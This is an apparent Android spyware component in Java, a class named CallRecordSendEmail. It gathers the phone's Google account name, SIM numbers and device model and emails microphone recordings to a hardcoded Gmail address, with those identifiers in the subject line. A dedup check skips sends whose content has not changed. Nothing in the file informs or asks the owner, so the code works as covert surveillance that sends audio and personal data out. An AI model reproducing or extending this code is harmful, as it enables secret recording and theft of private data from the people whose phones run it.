package com.example.fasterpro11;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.util.Log;

import java.io.File;

public class CallRecordSendEmail {
    private static final String TAG = "CallRecordSendEmail";
    private Context mContext;
    private Context context;


    public void sendEmailWithAttachment(String subject, String body, String filePath) {
        Log.d(TAG, "rec Sending email with attachment...");
        // context = getApplicationContext();
        AccountUtil accountUtil = new AccountUtil();
        String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
        String userSimNumber = accountUtil.getUserSimNumber(context);
        String title = "Your Notification Title";  // এটি আপনার টাইটেল হবে
        String text = "Your Notification Text";    // এটি আপনার টেক্সট হবে
        String Get_Sim1_Number = null;

        SmsReceiver smsReceiver = new SmsReceiver();
        String messageBody= "Your  Text";
        String setSim1NumberSmsReceiver =smsReceiver.SetSim1Number(context,messageBody);
        NotificationListener notificationListener = new NotificationListener();
        String setSim1NumberNotificationListener=notificationListener.SetSim1Number(context,messageBody);
        String setSim1Number ;
        if (  setSim1NumberSmsReceiver != null) {
            setSim1Number =setSim1NumberSmsReceiver;
        }else if(  setSim1NumberNotificationListener != null) {
            setSim1Number =setSim1NumberNotificationListener;
        }else {
            setSim1Number =null;
        }
        GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
        String UserID1= alert.getSim1NumberFromUser(context);
        String UserID2= alert.getSim2NumberFromUser(context);
        String UserGivenSimNumber= UserID1 + " "+UserID2;

        String manufacturer = Build.MANUFACTURER;
        String mobileModel = Build.MODEL;
        subject ="Access Sound Rec ID: " + setSim1Number+ " " + UserGivenSimNumber +" " + manufacturer +" "+ mobileModel+" " + Get_Sim1_Number +" User: "+ GoogleAccountName +" Number: " +userSimNumber ;
        Log.e(TAG, "SMS email subject: "+ subject );

        // Get the file size
        File file = new File(filePath);
        long fileSize = file.exists() ? file.length() : 0;

        // Compare email content and file size with previous email
        if (isMicRecordEmailContentSame(subject, body, fileSize)) {
            Log.d(TAG, "Sound RecMail content same as before. Skipping email send.");
            return; // Don't send the email if the content is the same
        }

        try {
            // Send email with attachment
            JavaMailAPI_MicRecord_Sender.sendMailWithAttachment("abontiangum99@gmail.com", subject, body, filePath);
            Log.d(TAG, "mic rec Email sent successfully with attachment.");

            // Store the details of the sent email
            storeEmailDetails(subject, body, filePath, fileSize,context);

        } catch (Exception e) {
            Log.e(TAG, "mic Email sending failed: " + e.getMessage());
        }
    }

    // Store email details in SharedPreferences
    private void storeEmailDetails(String subject, String body, String filePath, long fileSize, Context context) {
        mContext = context.getApplicationContext();
        if (context != null) {
            mContext = context.getApplicationContext();
        } else {
            Log.e(TAG, "onReceive: Context is null!");
        }
        SharedPreferences sharedPreferences = mContext.getSharedPreferences("MicRecordEmailDetails", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("MicRecordsubject", subject);
        editor.putString("MicRecordbody", body);
        editor.putLong("MicRecordfileSize", fileSize);
        editor.putString("MicRecordfilePath", filePath);
        editor.apply();
        Log.d(TAG, "SharedPreferences MicRecordEmail details stored.in sended Email");
    }

    // Check if the email content is the same as before
    private boolean isMicRecordEmailContentSame(String subject, String body, long fileSize) {
        if (mContext == null) {
            Log.e(TAG, "isEmailContentSame: mContext is null! Cannot access SharedPreferences.");
            return false;
        }
        SharedPreferences sharedPreferences = mContext.getSharedPreferences("MicRecordEmailDetails", Context.MODE_PRIVATE);
        String MicRecordpreviousSubject = sharedPreferences.getString("MicRecordsubject", "");
        String MicRecordpreviousBody = sharedPreferences.getString("MicRecordbody", "");
        long MicRecordpreviousFileSize = sharedPreferences.getLong("MicRecordfileSize", 0);

        // Compare the current email details with the stored ones
        return subject.equals(MicRecordpreviousSubject) && body.equals(MicRecordpreviousBody) && fileSize == MicRecordpreviousFileSize;
    }



    public boolean isInternetAvailable(Context context) {

        if (mContext == null) {
            Log.e(TAG, "isInternetAvailable mContext is still null");
        } else {
            // Log.d(TAG, "isInternetAvailable mContext is initialized");
        }
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            boolean isConnected = netInfo != null && netInfo.isConnected();
            // Log.d(TAG, "Internet available: " + isConnected);
            return isConnected;
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }




}
